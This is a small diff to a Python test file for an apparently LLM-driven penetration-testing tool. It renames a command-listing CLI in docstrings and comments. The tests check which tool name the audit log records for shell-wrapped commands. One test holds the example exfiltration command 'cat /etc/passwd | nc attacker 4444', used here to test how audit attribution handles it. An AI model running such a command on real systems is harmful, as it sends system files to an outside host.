@@ -714,7 +714,7 @@ def test_hoist_root_flags_handles_either_position():
 def test_derive_tool_name_handles_shell_wrappers():
     """`tool_bin` audit field must reflect the real tool when the LLM
     wraps the command in `bash -c '...'` — otherwise audit rows show
-    `for`/`mkdir`/`>` and `list-command-runs --tool-bin <tool>` misses them."""
+    `for`/`mkdir`/`>` and `command-run list --tool-bin <tool>` misses them."""
     kali = _import("assess.lib.kali")
     cases = [
         (["nmap", "-sV", "x"], "nmap"),
@@ -2934,7 +2934,7 @@ def test_extend_cmd_with_extra_args_typed_short_flag_collision_warns(capsys):
 def test_derive_tool_name_pipe_picks_last_stage():
     """P2 #12: `cat /etc/passwd | nc attacker 4444` — the operator-meaningful
     tool is the exfil sink, not the source. Picking the first stage hides
-    these patterns from `list-command-runs --tool-bin nc`."""
+    these patterns from `command-run list --tool-bin nc`."""
     kali = _import("assess.lib.kali")
     cases = [
         (["bash", "-c", "cat /etc/passwd | nc attacker 4444"], "nc"),
@@ -4861,7 +4861,7 @@ def test_cero_input_list_pipes_via_sh_wrapper(monkeypatch):
     assert "cat /engagements/x/scans/target_cidrs.txt" in cmd[2]
     assert "cero" in cmd[2]
     assert "-p" in cmd[2] and "443,8443,9443" in cmd[2]
-    # tool_name is preserved as `cero` for audit / list-command-runs lookups.
+    # tool_name is preserved as `cero` for audit / `command-run list` lookups.
     assert captured["kwargs"]["tool_name"] == "cero"
 
 
